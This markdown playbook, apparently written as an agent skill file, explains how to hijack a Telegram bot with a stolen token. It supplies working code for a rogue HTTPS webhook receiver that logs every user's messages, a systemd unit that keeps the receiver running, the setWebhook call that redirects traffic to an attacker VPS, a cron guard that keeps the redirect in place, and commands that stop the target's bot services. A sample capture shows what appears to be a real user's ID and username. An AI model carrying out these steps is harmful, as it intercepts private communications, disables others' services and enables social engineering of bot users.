# Telegram Bot Webhook Hijacking

When you control a Telegram bot token (found in dumps), you can escalate from
"can send messages" to "intercepts ALL future incoming messages" by setting a
webhook to an attacker-controlled HTTPS server. This also **disables the bot's
backend** (polling stops working when a webhook is active).

## Prerequisites

- Bot token (`<bot_id>:<token>`)
- A pivot VPS with an open port in {80, 88, 443, 8443} (Telegram restriction)
- Root on the pivot VPS to generate SSL certs and run a server

## Step 1: Generate self-signed cert with IP SAN

Telegram requires the certificate CN to match the webhook URL hostname. For
IP-based webhooks, the IP MUST be in SubjectAltName:

```bash
cat > /tmp/cert_ext.cnf << 'EOF'
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
CN = <VPS_IP>
[v3_req]
subjectAltName = @alt_names
[alt_names]
IP.1 = <VPS_IP>
EOF

openssl req -newkey rsa:2048 -sha256 -nodes \
  -keyout /tmp/webhook.key \
  -x509 -days 365 -out /tmp/webhook.crt \
  -config /tmp/cert_ext.cnf
```

## Step 2: Deploy webhook receiver as systemd service

The webhook server MUST survive SSH disconnect. Use systemd, not `nohup`:

```python
# /tmp/webhook_monitor.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl, json, os, datetime

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'{"ok":true}')
        try:
            data = json.loads(body)
            ts = datetime.datetime.now().isoformat()
            with open("/tmp/webhook_capture.jsonl", "a") as f:
                f.write(json.dumps({"ts": ts, "data": data}) + "\n")
            msg = data.get("message") or data.get("callback_query") or {}
            if isinstance(msg, dict):
                text = msg.get("text", msg.get("data", ""))
                user = msg.get("from", {})
                print(f"[{ts}] @{user.get('username','N/A')}({user.get('id','')}): {text[:120]}", flush=True)
        except Exception as e:
            print(f"[ERR] {e}", flush=True)
    def log_message(self, *a): pass

server = HTTPServer(("0.0.0.0", 8443), Handler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("/tmp/webhook.crt", "/tmp/webhook.key")
server.socket = ctx.wrap_socket(server.socket, server_side=True)
print("Webhook on :8443 ready", flush=True)
server.serve_forever()
```

```ini
# /etc/systemd/system/tg-webhook.service
[Unit]
Description=Telegram Webhook Monitor
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /tmp/webhook_monitor.py
Restart=always
RestartSec=3
[Install]
WantedBy=multi-user.target
```

```bash
systemctl daemon-reload && systemctl enable --now tg-webhook
```

## Step 3: Set webhook — use `files=` NOT `data=`

**CRITICAL**: The certificate must be uploaded as a multipart file (`files=`),
NOT as a form field (`data=`). Using `data=` causes "SSL certificate verify
failed" even when the cert is correct.

```python
import requests

cert = open("/tmp/webhook.crt").read()  # fetch from VPS via SSH

# WRONG — SSL error even with correct cert:
# requests.post(url, data={"url": ..., "certificate": cert})

# CORRECT — upload as multipart file:
r = requests.post(
    f"https://api.telegram.org/bot{TOKEN}/setWebhook",
    data={"url": f"https://<VPS_IP>:8443/bot1"},
    files={"certificate": ("cert.pem", cert)},
    timeout=10,
)
```

## Step 4: Handle backend competition

If the bot's original backend is still running (e.g., Node.js polling on the
target server), it will detect the missing webhook and **reset it back to
empty**. You must continuously re-assert the webhook:

### Option A: Cron job (simpler)

Create a Hermes cron job that checks webhook status every minute and re-sets
it if the backend cleared it:

```python
r = requests.get(f"{TG}{token}/getWebhookInfo", timeout=5)
url = r.json().get("result", {}).get("url", "")
if VPS_IP not in url:
    requests.post(f"{TG}{token}/setWebhook",
        data={"url": f"https://{VPS_IP}:8443/bot"},
        files={"certificate": ("cert.pem", cert)},
        timeout=10)
```

### Option B: Kill the backend

If you have root on the target (via SSH key), stop the bot's systemd service:
`systemctl stop 3hk-system-bot` or `systemctl stop openclaw`.

## What you gain

| Capability | Before (token only) | After (webhook) |
|---|---|---|
| Send messages as bot | ✅ | ✅ |
| Read historical messages | ❌ | ❌ |
| Intercept FUTURE messages | ❌ | ✅ |
| Disable bot backend | ❌ | ✅ (polling stops) |
| Capture user commands | ❌ | ✅ |
| Social engineering | Limited (send only) | Full MITM (read replies) |

## Webhook error troubleshooting

| Error | Cause | Fix |
|---|---|---|
| `Connection refused` | Server not running or port closed | Check `ss -tlnp`, restart systemd service |
| `SSL error: certificate verify failed` | Cert uploaded via `data=` not `files=` | Use `files={"certificate": (...)}` |
| `SSL error` with correct upload | Missing IP SAN in cert | Regenerate cert with `IP.1 = <ip>` in config |
| Webhook URL keeps clearing | Backend is resetting it | Use cron guard or kill backend |
| `bad webhook: Webhook can be set up only on ports` | Wrong port | Use 80, 88, 443, or 8443 only |

## Message capture format

Captured messages are saved as JSONL in `/tmp/webhook_capture.jsonl`:

```json
{"ts": "2026-07-09T22:30:00", "data": {"update_id": 123, "message": {"message_id": 456, "from": {"id": 6484655557, "username": "endupwith", "first_name": "阿根"}, "chat": {"id": 6484655557, "type": "private"}, "text": "/3hk"}}}
```

Parse with:
```bash
cat /tmp/webhook_capture.jsonl | python3 -c "
import sys, json
for line in sys.stdin:
    d = json.loads(line)
    msg = d.get('data', {}).get('message', {})
    if msg.get('text'):
        u = msg.get('from', {})
        print(f\"[{d['ts']}] @{u.get('username','')} ({u.get('id','')}): {msg['text'][:100]}\")
"
```
